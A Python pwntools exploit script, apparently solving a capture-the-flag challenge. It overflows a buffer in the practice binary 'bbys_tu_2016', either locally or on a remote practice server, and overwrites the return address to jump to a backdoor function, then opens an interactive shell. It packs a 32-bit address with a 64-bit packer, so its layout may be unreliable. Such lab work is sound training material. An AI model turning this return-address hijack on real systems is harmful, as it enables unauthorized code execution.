#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./bbys_tu_2016")
	elf = ELF("./bbys_tu_2016")
else:
	p = remote('node3.buuoj.cn',27732)
	elf = ELF("./bbys_tu_2016")

backdoor = 0x804856D
offset = 0xc

payload = 'A' * offset + 'deadbeef' + p64(backdoor)
sl(payload)

ia()
